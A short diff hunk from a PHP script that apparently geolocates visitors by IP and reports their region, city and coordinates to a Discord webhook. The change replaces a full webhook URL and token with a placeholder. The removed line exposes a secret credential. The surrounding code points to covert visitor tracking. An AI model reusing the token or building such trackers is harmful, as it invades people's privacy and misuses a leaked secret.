@@ -51,7 +51,7 @@ $Region = $Info->regionName;
 $City = $Info->city;
 $COORD = "$Info->lat, $Info->lon"; // Coordinates
 
-$webhookurl = "https://discord.com/api/webhooks/919635346931732561/VelQFZGiI6vOW42UhYmmFhO6CSefMWQwvIn-d6Ko6Zh97H6MPWQKjRNeBM1mwS6uCB2O";
+$webhookurl = "insert";
 
 
 $timestamp = date("c", strtotime("now"));
